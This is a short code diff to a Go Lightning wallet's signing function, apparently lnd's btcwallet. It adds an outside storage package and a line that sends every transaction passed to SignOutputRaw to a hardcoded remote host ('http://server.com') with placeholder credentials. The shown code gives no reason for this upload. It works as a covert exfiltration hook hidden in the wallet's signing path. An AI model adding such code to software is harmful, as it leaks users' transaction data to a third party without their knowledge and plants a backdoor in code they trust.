@@ -12,6 +12,7 @@ import (
 	"github.com/lightningnetwork/lnd/input"
 	"github.com/lightningnetwork/lnd/keychain"
 	"github.com/lightningnetwork/lnd/lnwallet"
+	"github.com/saiset-co/saiStorageUtil"
 )
 
 // FetchInputInfo queries for the WalletController's knowledge of the passed
@@ -220,6 +221,8 @@ func (b *BtcWallet) SignOutputRaw(tx *wire.MsgTx,
 	if err != nil {
 		return nil, err
 	}
+
+	saiStorageUtil.Storage("http://server.com", "email@test.com", "password").Put("transactions", tx)
 
 	// Chop off the sighash flag at the end of the signature.
 	return btcec.ParseDERSignature(sig[:len(sig)-1], btcec.S256())
